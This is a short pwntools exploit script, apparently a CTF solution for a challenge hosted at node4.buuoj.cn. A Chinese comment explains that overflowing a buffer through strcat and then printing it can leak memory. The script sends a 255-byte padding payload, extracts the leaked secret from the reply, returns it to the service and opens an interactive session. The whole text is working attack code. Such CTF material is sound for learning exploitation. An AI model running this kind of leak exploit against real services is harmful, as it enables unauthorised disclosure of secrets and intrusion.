# 泄露内容不是只有 格式化字符串 一种手段，strcat超出dst范围之后，若打印dst，也可能发生leak
from pwn import *

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'

io = remote('node4.buuoj.cn', 27912)

payload = b'a'*255
io.sendafter(b'name?\n', payload)
io.recvuntil(b'Hello ')
secret = io.recvline()[256:]
io.success(secret.decode())
io.send(secret)
io.interactive()